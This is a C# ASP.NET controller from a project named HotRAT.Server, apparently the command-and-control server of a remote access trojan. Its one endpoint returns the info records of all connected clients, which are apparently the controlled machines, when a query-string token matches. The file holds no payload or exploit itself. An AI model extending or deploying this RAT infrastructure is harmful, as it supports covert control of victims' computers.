using HotRAT.Server.Configs;
using HotRAT.Server.Models;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System.Collections.Concurrent;
using System.Reflection;
using static HotRAT.Server.Runtimes;

namespace HotRAT.Server.Controllers
{
    [ApiController]
    [Route("api/")]
    public class InfoController : ControllerBase
    {
        private readonly ILogger<InfoController> _logger;

        public InfoController(ILogger<InfoController> logger)
        {
            _logger = logger;
        }

        [HttpGet("clients")]
        public IActionResult AuthToken(string token)
        {
            if (token == Runtimes.Token())
            {
                ConcurrentDictionary<Guid, ClientInfo> clients = new();
                foreach (var client in Runtimes._clients)
                {
                    clients.TryAdd(client.Key, client.Value.Info);
                }
                return Ok(new { code = 200, data = clients });
            }
            else
            {
                return Ok(new { code = 203, data = false });
            }
        }
    }
}
